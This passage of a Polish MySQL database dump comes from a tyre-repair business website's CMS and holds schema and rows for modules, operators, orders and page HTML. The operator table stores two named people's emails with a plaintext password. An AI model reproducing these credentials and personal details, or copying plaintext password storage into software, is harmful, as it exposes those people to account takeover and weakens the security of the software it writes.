(2, '2008-12-10 15:49:49', '2010-08-23 10:58:36', 'en', 'utf8_general_ci', 'Y', 'N'),
(1, '0000-00-00 00:00:00', '2010-08-23 10:59:19', 'pl', 'utf8_polish_ci', 'Y', 'N');

-- --------------------------------------------------------

--
-- Struktura tabeli dla tabeli `meta_tag`
--

CREATE TABLE IF NOT EXISTS `meta_tag` (
  `id_meta_tag` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `meta_title` varchar(255) NOT NULL,
  `meta_title_overwrite` enum('0','1') NOT NULL DEFAULT '0',
  `meta_keywords` text NOT NULL,
  `meta_keywords_overwrite` enum('0','1') NOT NULL DEFAULT '0',
  `meta_description` text NOT NULL,
  `meta_description_overwrite` enum('0','1') NOT NULL DEFAULT '0',
  `meta_robots` varchar(255) NOT NULL,
  `meta_robots_overwrite` enum('0','1') NOT NULL DEFAULT '0',
  `language` varchar(3) NOT NULL,
  `active` enum('Y','N') NOT NULL DEFAULT 'N',
  `added` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `deleted` enum('Y','N') NOT NULL DEFAULT 'N',
  PRIMARY KEY (`id_meta_tag`),
  UNIQUE KEY `language` (`language`),
  KEY `active` (`active`),
  KEY `deleted` (`deleted`),
  KEY `meta_title_overwrite` (`meta_title_overwrite`),
  KEY `meta_keywords_overwrite` (`meta_keywords_overwrite`),
  KEY `meta_description_overwrite` (`meta_description_overwrite`),
  KEY `meta_robots_overwrite` (`meta_robots_overwrite`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;

--
-- Zrzut danych tabeli `meta_tag`
--

INSERT INTO `meta_tag` (`id_meta_tag`, `meta_title`, `meta_title_overwrite`, `meta_keywords`, `meta_keywords_overwrite`, `meta_description`, `meta_description_overwrite`, `meta_robots`, `meta_robots_overwrite`, `language`, `active`, `added`, `modified`, `deleted`) VALUES
(1, 'Wulkanizacja - Szczuczyn Grajewo Stawiski - Jarosław Filipkowski', '1', 'wulkanizacja, wulkanizacja opon, zakład wulkanizacyjny, opony, felgi, alufelgi, opony zimowe, opony letnie, wymiana, opony rolnicze', '1', 'Nasza firma istnieje na rynku od ponad 8 lat. Nasza firma znajduje się przy ul. Łąkowa 1A Szczuczyn. Jesteśmy firmą rodzinną. Dzięki newsleterowi bedą państwo na bieżąco z cenami naszych usług , opon oraz innych towarów.', '1', 'index, follow', '1', 'en', 'N', '2010-08-25 10:12:19', '2013-02-26 20:00:41', 'N');

-- --------------------------------------------------------

--
-- Struktura tabeli dla tabeli `module`
--

CREATE TABLE IF NOT EXISTS `module` (
  `id_module` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `action` varchar(255) NOT NULL,
  `name` varchar(255) NOT NULL,
  `order` int(2) NOT NULL,
  `protected` enum('N','Y') NOT NULL DEFAULT 'Y',
  `admin_only` enum('N','Y') NOT NULL DEFAULT 'N',
  `type` varchar(32) NOT NULL,
  PRIMARY KEY (`id_module`),
  KEY `action` (`action`),
  KEY `order` (`order`),
  KEY `admin_only` (`admin_only`),
  KEY `protected` (`protected`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=9 ;

--
-- Zrzut danych tabeli `module`
--

INSERT INTO `module` (`id_module`, `action`, `name`, `order`, `protected`, `admin_only`, `type`) VALUES
(1, 'operator', 'Operatorzy', 11, 'Y', 'Y', ''),
(2, 'event', 'Aktualności', 8, 'N', 'N', ''),
(3, 'general', 'Strona główna', 1, 'N', 'N', ''),
(4, 'meta_tag', 'Meta tagi', 9, 'Y', 'Y', ''),
(5, 'smtp_account', 'Konta pocztowe', 10, 'Y', 'Y', ''),
(6, 'dogs', 'Psy', 1, 'N', 'N', 'male'),
(7, 'dogs', 'Suki', 1, 'N', 'N', 'female'),
(8, 'generation', 'Mioty', 1, 'N', 'N', '');

-- --------------------------------------------------------

--
-- Struktura tabeli dla tabeli `operator`
--

CREATE TABLE IF NOT EXISTS `operator` (
  `id_operator` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(32) NOT NULL,
  `surname` varchar(32) NOT NULL,
  `email` varchar(64) NOT NULL,
  `password` varchar(200) NOT NULL,
  `super_user` enum('0','1') NOT NULL DEFAULT '0',
  `added` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `deleted` enum('Y','N') NOT NULL DEFAULT 'N',
  `active` enum('Y','N') NOT NULL DEFAULT 'N',
  PRIMARY KEY (`id_operator`),
  KEY `active` (`active`,`deleted`),
  KEY `super_user` (`super_user`),
  KEY `email` (`email`,`password`),
  KEY `deleted` (`deleted`),
  KEY `active_2` (`active`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=4 ;

--
-- Zrzut danych tabeli `operator`
--

INSERT INTO `operator` (`id_operator`, `name`, `surname`, `email`, `password`, `super_user`, `added`, `modified`, `deleted`, `active`) VALUES
(1, 'Robert', 'Filipkowski', 'rfilipkowski889@gmail.com', 'filip11', '1', '2013-02-03 16:16:38', '2011-12-14 19:52:52', 'N', 'Y'),
(3, 'Mariusz', 'Filipkowski', 'mariusz24245@gmail.com', 'filip11', '0', '2013-02-03 16:17:27', '2011-04-22 16:21:36', 'N', 'Y');

-- --------------------------------------------------------

--
-- Struktura tabeli dla tabeli `operator_module`
--

CREATE TABLE IF NOT EXISTS `operator_module` (
  `id_module` tinyint(2) NOT NULL,
  `id_operator` int(4) NOT NULL,
  `view` enum('1','0') DEFAULT '1',
  `edit` enum('1','0') DEFAULT '1',
  `del` enum('1','0') DEFAULT '1',
  PRIMARY KEY (`id_module`,`id_operator`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- Zrzut danych tabeli `operator_module`
--

INSERT INTO `operator_module` (`id_module`, `id_operator`, `view`, `edit`, `del`) VALUES
(1, 1, '1', '1', '1'),
(5, 1, '1', '1', '1'),
(4, 1, '1', '1', '1'),
(4, 2, '1', '1', '1'),
(5, 2, '1', '1', '1'),
(1, 2, '1', '1', '1'),
(4, 3, '1', '1', '1'),
(5, 3, '1', '1', '1'),
(1, 3, '1', '1', '1');

-- --------------------------------------------------------

--
-- Struktura tabeli dla tabeli `order`
--

CREATE TABLE IF NOT EXISTS `order` (
  `id_order` int(12) unsigned NOT NULL AUTO_INCREMENT,
  `id_service` int(11) unsigned NOT NULL,
  `name` varchar(255) NOT NULL,
  `address` text NOT NULL,
  `email` varchar(255) NOT NULL,
  `phone` varchar(255) NOT NULL,
  `comment` text NOT NULL,
  `price` float(10,2) NOT NULL,
  `message` text NOT NULL,
  `added` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00' ON UPDATE CURRENT_TIMESTAMP,
  `deleted` enum('Y','N') NOT NULL DEFAULT 'N',
  `active` enum('Y','N') NOT NULL DEFAULT 'N',
  PRIMARY KEY (`id_order`),
  KEY `id_service` (`id_service`),
  KEY `deleted` (`deleted`,`active`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=42 ;

--
-- Zrzut danych tabeli `order`
--

INSERT INTO `order` (`id_order`, `id_service`, `name`, `address`, `email`, `phone`, `comment`, `price`, `message`, `added`, `modified`, `deleted`, `active`) VALUES
(16, 3, 'Marcin Jarząbek', 'Katowicka 99, Warszawa', 'witek@sns.pl', '33009988', 'takie tam', 44.00, 'Please make prepayment.\r\nThe rest money should be paid after the service is finished.\r\n\r\nIn any doubt, please contact us.', '2010-03-04 11:03:04', '2010-07-27 13:04:24', 'N', 'Y'),
(15, 2, 'Krzysztof Skoczylas', 'Waszawska 88', 'witek@sns.pl', '44556677', 'bez komentarza', 15.00, '', '2010-03-04 10:53:58', '2010-03-04 10:55:08', 'N', 'Y'),
(7, 2, 'Imię nazwisko', 'adresowa 5', 'lukasz@sns.pl', '666', 'komentarz', 43.00, 'Jakaś wiadomość\r\n\r\nI inna...', '2010-03-02 13:28:15', '2010-07-27 13:09:18', 'N', 'Y'),
(8, 1, 'Łukasz Dziergwa', 'Żeromskiego 52 Łódź', 'ldziergwa@gmail.com', '666-66-665-7', 'bez komentarza', 10.00, 'Jakaś wiadomość', '2010-03-02 20:41:06', '2010-07-27 13:06:33', 'N', 'Y'),
(14, 1, 'Jan Kateusz', 'Nowojorska 66', 'witek@sns.pl', '55009988', 'No comments', 5.00, '', '2010-03-04 10:25:36', '2010-03-04 10:34:48', 'N', 'Y'),
(18, 2, 'Lorem ipsum', 'żeromskiego 52', 'agnieszka@sns.pl', '123456789', 'orem ipsum dolor sit amet, consectetur adipiscing elit. Proin scelerisque diam id mauris. Etiam placerat ornare diam. Nunc pellentesque arcu ac augue. Integer vitae libero.\r\n\r\nDuis est. Phasellus porttitor velit auctor nisi. Nullam vel lectus a elit facilisis accumsan. Mauris pellentesque, erat at rhoncus semper, urna mauris suscipit ipsum.\r\n\r\nLorem ipsum dolor sit amet, consectetur adipiscing elit. Proin scelerisque diam id mauris. Etiam placerat ornare diam. Nunc pellentesque arcu ac augue. Integer vitae libero.', 0.00, '', '2010-03-05 09:51:32', '2010-07-27 13:08:09', 'N', 'N'),
(19, 3, 'Lorem ipsum', 'Żeromskiego 54 90-770 Łódź', 'agnieszka@sns.pl', '12345679', 'Duis est. Phasellus porttitor velit auctor nisi. Nullam vel lectus a elit facilisis accumsan. Mauris pellentesque, erat at rhoncus semper, urna mauris suscipit ipsum.\r\n\r\nLorem ipsum dolor sit amet, consectetur adipiscing elit. Proin scelerisque diam id mauris. Etiam placerat ornare diam. Nunc pellentesque arcu ac augue. Integer vitae libero.\r\n\r\nDuis est. Phasellus porttitor velit auctor nisi. Nullam vel lectus a elit facilisis accumsan. Mauris pellentesque, erat at rhoncus semper, urna mauris suscipit ipsum.', 0.00, '', '2010-03-05 09:53:34', '2010-07-27 13:07:50', 'N', 'N'),
(20, 3, 'Lorem ipsum dolor', 'Żeromskiego 78-987 Łódź', 'agnieszka@sns.pl', '123456798', 'Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin scelerisque diam id mauris. Etiam placerat ornare diam. Nunc pellentesque arcu ac augue. Integer vitae libero.\r\n\r\nDuis est. Phasellus porttitor velit auctor nisi. Nullam vel lectus a elit facilisis accumsan. Mauris pellentesque, erat at rhoncus semper, urna mauris suscipit ipsum.\r\n\r\nLorem ipsum dolor sit amet, consectetur adipiscing elit. Proin scelerisque diam id mauris. Etiam placerat ornare diam. Nunc pellentesque arcu ac augue. Integer vitae libero.', 0.00, '', '2010-03-05 09:56:10', '2010-07-27 13:07:03', 'N', 'N'),
(21, 3, 'Lorem ipsum', 'Żeromskiego 890 908-98 Łódź', 'agnieszka@sns.pl', '13456789', ' \r\nRegeneracja kompleksowa\r\n\r\nLorem ipsum dolor sit amet, consectetur adipiscing elit. Proin scelerisque diam id mauris. Etiam placerat ornare diam. Nunc pellentesque arcu ac augue. Integer vitae libero.\r\n\r\nDuis est. Phasellus porttitor velit auctor nisi. Nullam vel lectus a elit facilisis accumsan. Mauris pellentesque, erat at rhoncus semper, urna mauris suscipit ipsum.\r\n\r\nLorem ipsum dolor sit amet, consectetur adipiscing elit. Proin scelerisque diam id mauris. Etiam placerat ornare diam. Nunc pellentesque arcu ac augue. Integer vitae libero.', 0.00, '', '2010-03-05 10:03:03', '2010-07-27 13:07:27', 'N', 'N'),
(22, 2, 'Lorem ipsum ', 'kilinskiego 89 ', 'agnieszka@sns.pl', '789465123', 'Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin scelerisque diam id mauris. Etiam placerat ornare diam. Nunc pellentesque arcu ac augue. Integer vitae libero.\r\n\r\nDuis est. Phasellus porttitor velit auctor nisi. Nullam vel lectus a elit facilisis accumsan. Mauris pellentesque, erat at rhoncus semper, urna mauris suscipit ipsum.\r\n\r\nLorem ipsum dolor sit amet, consectetur adipiscing elit. Proin scelerisque diam id mauris. Etiam placerat ornare diam. Nunc pellentesque arcu ac augue. Integer vitae libero.', 0.00, '', '2010-03-05 10:09:15', '0000-00-00 00:00:00', 'N', 'N'),
(38, 3, 'Imię Nazwisko', 'Adresowa 5/2', 'ldziergwa@gmail.com', '666-666-666', 'Nie mam uwag', 0.00, '', '2010-08-06 13:45:23', '0000-00-00 00:00:00', 'N', 'N'),
(39, 3, 'Imię Nazwisko', 'Adresowa 5/2', 'ldziergwa@gmail.com', '666-666-666', 'Nie mam uwag', 0.00, '', '2010-08-06 14:18:46', '0000-00-00 00:00:00', 'N', 'N'),
(40, 3, 'Imię Nazwisko', 'Adresowa 5/2', 'ldziergwa@gmail.com', '666-666-666', 'Nie mam uwag', 0.00, '', '2010-08-06 15:10:05', '0000-00-00 00:00:00', 'N', 'N'),
(41, 3, 'Imię i Nazwisko', 'adresowa 5', 'ldziergwa@gmail.com', '666-66-666', 'Kilka drobnych uwag - zażółć gęślą jaźń', 10.00, '10 dolców powinno wystarczyć', '2010-08-25 14:02:44', '2010-08-25 14:04:13', 'N', 'Y');

-- --------------------------------------------------------

--
-- Struktura tabeli dla tabeli `otherpage`
--

CREATE TABLE IF NOT EXISTS `otherpage` (
  `id_otherpage` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(128) NOT NULL,
  `key_title` varchar(32) NOT NULL,
  `key_content` varchar(32) NOT NULL,
  `deleted` enum('Y','N') NOT NULL DEFAULT 'N',
  `active` enum('Y','N') NOT NULL DEFAULT 'Y',
  `added` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00' ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id_otherpage`),
  KEY `key_title` (`key_title`),
  KEY `key_content` (`key_content`),
  KEY `deleted` (`deleted`,`active`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=13 ;

--
-- Zrzut danych tabeli `otherpage`
--

INSERT INTO `otherpage` (`id_otherpage`, `name`, `key_title`, `key_content`, `deleted`, `active`, `added`, `modified`) VALUES
(1, 'Who we are?', '8f6a8012bf4a741281a59e1657c57221', '7274fc44f6b52726133eb834bd8ec803', 'Y', '', '2009-05-19 10:11:32', '2011-03-14 12:46:08'),
(2, 'Welcome', '17376dbd981a4bad53f231e6c65ef481', 'e367bd22319221676a2f5d0bb9b2be7a', 'Y', '', '2009-05-19 10:16:03', '2011-03-14 12:47:05'),
(3, 'Zamówienie wysłane', '3c5ecc9dfb002fea99ed7d7c4690777f', '964e2b394debd384c9be46502d9f8093', 'Y', 'Y', '2010-03-09 08:55:58', '2011-03-14 12:47:50'),
(4, 'hej', '7303081f2471e8135b33c031b44059f9', 'e9dfcfc71aea765e87416982e3f55dab', 'Y', '', '2011-03-14 12:42:29', '2011-03-14 12:43:50'),
(5, 'heartyeurope', 'bc2faeed4fb0fa276461fa34266ffa47', 'd6700706c043aded69559ceaa7854cfd', 'Y', '', '2011-03-14 12:48:13', '2011-03-14 12:59:10'),
(6, 'test3', 'd695f631c77cee23349cd81fe32bab13', '355ee3cbec6b09f180e6fe15a59768c4', 'Y', '', '2011-03-14 14:45:05', '2011-05-10 22:37:50'),
(7, 'test4', '0e428ee357849004d71d6f970369211f', 'e3febbd9d85d90ca98b2458320439a0d', 'Y', '', '2011-03-15 12:39:53', '2011-05-10 22:38:04'),
(8, 'miejsce na Twoją rekalme', 'dffafa0317e53976c3fe0eaeb0ed68f0', '5d99f46fdef963bb1eb82d6c32fe3f44', 'N', '', '2011-05-10 22:47:04', '2011-05-10 22:47:04'),
(9, 'top', '1fb3b442db8ddd8d934921ff1cf60103', '7461832aa43d0f209f2ad23a939b8b91', 'N', '', '2011-12-03 12:09:33', '2011-12-03 12:09:33'),
(10, 'bottom', 'b4966bb8040fc59c37a6c322c6164260', '7f23d103ad83377f819a7c537ce9172d', 'N', '', '2011-12-03 12:09:39', '2011-12-03 12:09:39'),
(11, 'fachowa_obsluga', 'ef65183e6b2017b4f983b2132ff18261', '6af56a3184f76c730638ac8d09bbf5a9', 'N', '', '2011-12-03 12:14:40', '2011-12-03 12:14:40'),
(12, 'aktualnosc', '9b8752ec1ed17148eb576af7a92c7960', '4fcad4306279a911be7ab4eeb3ebbe4c', 'N', '', '2011-12-03 12:28:59', '2011-12-03 12:28:59');

-- --------------------------------------------------------

--
-- Struktura tabeli dla tabeli `page`
--

CREATE TABLE IF NOT EXISTS `page` (
  `id_page` int(12) unsigned NOT NULL AUTO_INCREMENT,
  `id_parent` int(12) unsigned NOT NULL,
  `id_module` tinyint(3) unsigned NOT NULL,
  `g` int(11) NOT NULL,
  `id_shop` int(11) NOT NULL,
  `session_shop` varchar(32) NOT NULL,
  `position` int(12) unsigned NOT NULL,
  `name` varchar(255) NOT NULL,
  `introduction` text NOT NULL,
  `content` text NOT NULL,
  `redirect` varchar(250) NOT NULL,
  `picture` varchar(255) NOT NULL,
  `picture_width` int(10) unsigned NOT NULL,
  `picture_height` int(10) unsigned NOT NULL,
  `picture_size` int(10) unsigned NOT NULL,
  `active` enum('Y','N') NOT NULL DEFAULT 'Y',
  `added` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00' ON UPDATE CURRENT_TIMESTAMP,
  `meta_title` text NOT NULL,
  `meta_description` text NOT NULL,
  `meta_keywords` text NOT NULL,
  `meta_robots` text NOT NULL,
  `meta_last_modified` varchar(255) NOT NULL,
  `priority` smallint(1) unsigned NOT NULL DEFAULT '5',
  `bottom_menu` enum('Y','N') NOT NULL DEFAULT 'N',
  `addable` enum('Y','N') NOT NULL DEFAULT 'Y',
  `deletable` enum('Y','N') NOT NULL DEFAULT 'Y',
  `statusable` enum('Y','N') NOT NULL DEFAULT 'Y',
  `renameable` enum('Y','N') NOT NULL DEFAULT 'Y',
  `editable` enum('Y','N') NOT NULL DEFAULT 'Y',
  `dragable` enum('Y','N') NOT NULL DEFAULT 'Y',
  `language` varchar(3) NOT NULL,
  PRIMARY KEY (`id_page`),
  KEY `addable` (`addable`,`deletable`,`statusable`,`renameable`,`editable`),
  KEY `dragable` (`dragable`),
  KEY `id_parent` (`id_parent`),
  KEY `active` (`active`),
  KEY `position` (`position`),
  KEY `language` (`language`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=62 ;

--
-- Zrzut danych tabeli `page`
--

INSERT INTO `page` (`id_page`, `id_parent`, `id_module`, `g`, `id_shop`, `session_shop`, `position`, `name`, `introduction`, `content`, `redirect`, `picture`, `picture_width`, `picture_height`, `picture_size`, `active`, `added`, `modified`, `meta_title`, `meta_description`, `meta_keywords`, `meta_robots`, `meta_last_modified`, `priority`, `bottom_menu`, `addable`, `deletable`, `statusable`, `renameable`, `editable`, `dragable`, `language`) VALUES
(2, 0, 3, 0, 0, '', 0, 'Strona główna', '', '', '', '', 0, 0, 0, 'Y', '2012-03-22 08:54:37', '2012-03-22 08:54:37', '', '', '', 'index, follow, all', 'Mar 22 2012 09:54:20', 5, 'Y', 'Y', 'N', 'Y', 'Y', 'Y', 'N', 'en'),
(49, 0, 0, 0, 0, '', 2, 'Oferta', '', '<p style="text-align: left;">\r\n	&nbsp;</p>\r\n<h3 style="text-align: left;">\r\n	<span style="color: rgb(0, 0, 128);"><span style="font-size: 14px;">&nbsp; Opony wszystkich marek i typ&oacute;w &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span></span></h3>\r\n<ul>\r\n	<li>\r\n		<h3>\r\n			<span style="color:#000000;">&nbsp;&nbsp; <span style="font-size: 12px;">(Osobowe, Dostawcze, Terenowe, Przemysłowe, Rolnicze i inne) &nbsp; &nbsp; &nbsp;</span></span></h3>\r\n	</li>\r\n	<li>\r\n		<h3>\r\n			<span style="color:#000000;"><span style="font-size: 12px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></span><span style="font-size: 12px;">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span></h3>\r\n	</li>\r\n</ul>\r\n<ul>\r\n	<li>\r\n		&nbsp;&nbsp; - opony nowe, używane i bieżnikowane &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="text-align: right;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span></li>\r\n	<li>\r\n		&nbsp;&nbsp; - opony letnie</li>\r\n	<li>\r\n		&nbsp;&nbsp; - opony zimowe</li>\r\n	<li>\r\n		&nbsp;&nbsp; - opony całoroczne</li>\r\n	<li>\r\n		&nbsp;&nbsp; - do nowych opon bezpłatny montaż i wyważenie</li>\r\n	<li>\r\n		&nbsp;&nbsp; - opony renomowanych firm do wszystkich typ&oacute;w pojazd&oacute;w</li>\r\n	<li>\r\n		&nbsp;&nbsp; - bardzo niskie ceny, miła i profesjonalna obsuga &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</li>\r\n</ul>\r\n<h3 style="text-align: left;">\r\n	<span style="color:#000080;"><span style="font-size: 14px;">&nbsp; Felgi</span></span></h3>\r\n<ul>\r\n	<li style="text-align: left;">\r\n		<span style="color: rgb(0, 0, 0);">&nbsp;&nbsp; - felgi nowe i używane</span></li>\r\n	<li style="text-align: left;">\r\n		<span style="color: rgb(0, 0, 0);">&nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0);"> - felgi stalowe</span></li>\r\n	<li style="text-align: left;">\r\n		<span style="color: rgb(0, 0, 0);">&nbsp;&nbsp; - felgi aluminiowe</span></li>\r\n</ul>\r\n<h3>\r\n	<span style="font-size:14px;"><span style="color: rgb(0, 0, 128);">&nbsp; Akumulatory</span></span></h3>\r\n<p>\r\n	&nbsp;</p>\r\n<h3>\r\n	<span style="font-size:14px;"><span style="color: rgb(0, 0, 128);">&nbsp; Kołpaki</span></span></h3>\r\n<p>\r\n	&nbsp;</p>\r\n<h3>\r\n	<span style="font-size:14px;"><span style="color: rgb(0, 0, 128);">&nbsp; Dętki</span></span></h3>\r\n<p>\r\n	&nbsp;</p>\r\n<h3>\r\n	<span style="color:#000080;">&nbsp; <span style="font-size:14px;">Części samochodowe</span></span></h3>\r\n<p>\r\n	&nbsp;</p>\r\n<ul>\r\n	<li>\r\n		<span style="color:#000000;"><cite>&nbsp; &nbsp;&nbsp; Część towar&oacute;w sprzedawana jest na zm&oacute;wienie z okresem oczekiwania nie</cite></span></li>\r\n	<li>\r\n		<span style="color: rgb(0, 0, 0);"><cite>&nbsp; przekraczających 24h. Przy trudno dostepnych towarach czas ten może sie </cite></span></li>\r\n	<li>\r\n		<span style="color: rgb(0, 0, 0);"><cite>&nbsp; wydłużyc.</cite></span></li>\r\n</ul>\r\n', '', '', 0, 0, 0, 'Y', '2013-06-26 15:45:02', '2013-06-26 15:45:02', '', '', '', 'index, follow, all', 'Jun 26 2013 17:44:00', 5, 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'en'),
(58, 0, 0, 0, 0, '', 3, 'Usługi', '', '<h1>\r\n	&nbsp;</h1>\r\n<h1>\r\n	<span style="color:#000080;"><span style="font-size: 18px;"><strong>Świadczone przez nas usługi wulkanizacyjne:</strong></span></span></h1>\r\n<h3 style="color: blue;">\r\n	<span style="font-size:14px;"><span style="color: rgb(0, 0, 0);">&nbsp; &nbsp; Naprawa i wymiana k&oacute;ł wszelkich marek</span></span></h3>\r\n<ul>\r\n	<li>\r\n		&nbsp;&nbsp;&nbsp; - Osobowe</li>\r\n	<li style="text-align: left;">\r\n		&nbsp;&nbsp;&nbsp; - Dostawcze</li>\r\n	<li style="text-align: left;">\r\n		&nbsp;&nbsp;&nbsp; - Terenowe</li>\r\n	<li style="text-align: left;">\r\n		<strong><em>&nbsp;&nbsp;&nbsp; - Motocyklowe</em></strong></li>\r\n	<li style="text-align: left;">\r\n		&nbsp;&nbsp;&nbsp; - Przemysłowe</li>\r\n	<li style="text-align: left;">\r\n		&nbsp;&nbsp;&nbsp; - Rolnicze</li>\r\n	<li style="text-align: left;">\r\n		&nbsp;&nbsp;&nbsp; - Inne</li>\r\n</ul>\r\n<h3 style="color: blue;">\r\n	<span style="color:#000000;">&nbsp;&nbsp;&nbsp; <span style="font-size:14px;">Komputerowe wyważanie k&oacute;ł (Felgi stalowe i aluminiowe)</span></span></h3>\r\n<ul>\r\n	<li>\r\n		&nbsp;&nbsp;&nbsp; - Osobowe</li>\r\n	<li>\r\n		&nbsp;&nbsp;&nbsp; - Dostawcze&nbsp;</li>\r\n	<li>\r\n		&nbsp;&nbsp;&nbsp; - Terenowe</li>\r\n</ul>\r\n<h1 style="color: blue;">\r\n	<span style="font-size:18px;"><span style="color: rgb(0, 0, 128);">&nbsp;Pozostałe usługi:</span></span></h1>\r\n<ul>\r\n	<li>\r\n		&nbsp;&nbsp;&nbsp; - Wyr&oacute;wnywanie ciśnienia w kołach</li>\r\n	<li>\r\n		&nbsp;&nbsp;&nbsp; - Doważanie k&oacute;ł</li>\r\n	<li>\r\n		&nbsp;&nbsp;&nbsp; - Łatanie dętek</li>\r\n	<li>\r\n		&nbsp;&nbsp;&nbsp; - Wymiania wentylnicy</li>\r\n	<li>\r\n		&nbsp; &nbsp; - Utylizacja zużytych opon</li>\r\n	<li>\r\n		&nbsp;&nbsp;&nbsp; - Naprawa koł w terenie</li>\r\n</ul>\r\n<h1 style="color: blue;">\r\n	<span style="font-size:18px;"><span style="text-align: left;">&nbsp;Gwarantujemy państwu:</span></span></h1>\r\n<ul>\r\n	<li>\r\n		<span style="font-size:12px;"><span style="text-align: left;">&nbsp;&nbsp; &nbsp;</span></span><span style="text-align: left;"> - Najniższe ceny</span></li>\r\n	<li>\r\n		&nbsp;&nbsp;&nbsp; - Najwyższa Jakość usług</li>\r\n	<li>\r\n		&nbsp;&nbsp;&nbsp; - Fachowa porada</li>\r\n	<li>\r\n		&nbsp;&nbsp;&nbsp; - Doradztwo techniczne i pomoc w doborze ogumienia</li>\r\n	<li>\r\n		&nbsp;&nbsp;&nbsp; - Miła i szybka obsługa</li>\r\n</ul>\r\n<p style="text-align: left; ">\r\n	<em>&nbsp; </em></p>\r\n<ul>\r\n	<li style="text-align: left; ">\r\n		<em>&nbsp; &nbsp;&nbsp;&nbsp; Wybierając naszą Firmę decydujesz się na fachowo wykonaną usługę po </em></li>\r\n	<li style="text-align: left;">\r\n		<em>&nbsp; &nbsp; konkurencyjnych cenach! Jeśli masz pytania zapraszam do działu kontakt:</em></li>\r\n</ul>\r\n<p>\r\n	&nbsp;</p>\r\n', '', '', 0, 0, 0, 'Y', '2012-02-16 12:23:27', '2012-02-16 12:23:27', 'apr', '', '', 'index, follow, all', 'Feb 16 2012 13:23:05', 5, 'N', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'en'),
(57, 0, 0, 0, 0, '', 7, 'Kontakt', '', '<h1 style="text-align: center; ">\r\n	&nbsp;</h1>\r\n<h1 style="text-align: center; ">\r\n	&nbsp;</h1>\r\n<h1 style="text-align: center; ">\r\n	<em><span style="font-size:20px;"><strong>&nbsp;<span style="font-size:22px;">Zakład Wulkanizacyjny&nbsp;Jarosław Filipkowski&nbsp;</span></strong></span></em></h1>\r\n<div style="text-align: center; ">\r\n	<em><span style="font-size:16px;">19-230 Szczuczyn ul.Łąkowa 1A</span></em></div>\r\n<div style="text-align: center;">\r\n	&nbsp;</div>\r\n<div style="text-align: center;">\r\n	<span style="font-size:14px;">Regon: 200034620</span></div>\r\n<div style="text-align: center;">\r\n	<span style="font-size:14px;">Nip: 721-103-26-09</span></div>\r\n<div style="text-align: center; margin-left: 320px;">\r\n	